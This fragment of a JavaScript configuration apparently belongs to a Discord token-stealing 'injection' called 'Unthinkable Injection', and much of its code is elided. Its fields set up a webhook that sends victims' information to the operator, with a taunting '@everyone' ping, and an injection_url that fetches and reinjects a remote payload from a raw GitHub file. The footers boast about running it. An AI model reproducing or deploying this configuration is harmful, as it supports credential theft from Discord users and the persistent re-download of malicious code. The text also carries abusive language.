...
const config = {
  ...
  ping_val: '@everyone Fucktard actually tried', //change to @here or <@ID> to ping specific user if you want, will only send if ping_on_run is true
  embed_name: 'Unthinkable Injection', //name of the webhook thats gonna send the info
  embed_icon: 'https://cdn.discordapp.com/attachments/1103130793687142402/1103535456936788019/Unthinkable.png?size=4096'.replace(/ /g, '%20'), //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
  embed_color: 16777215, //color for the embed, needs to be hexadecimal (just copy a hex and then use https://www.binaryhexconverter.com/hex-to-decimal-converter to convert it)
  injection_url: 'https://raw.githubusercontent.com/Unthinkable123/powershell-injection/main/inj.js', //injection url for when it reinjects
  /**
    ...
    embeds: [
      {
        ...
        footer: {
          text: 'https://feds.lol/Unthinkable',
        },
      },
    ],
  };
    ...
    embeds: [
      {
        ...
        footer: {
          text: 'Unthinkable Runs This Shit',
        },
      },
    ],
  };
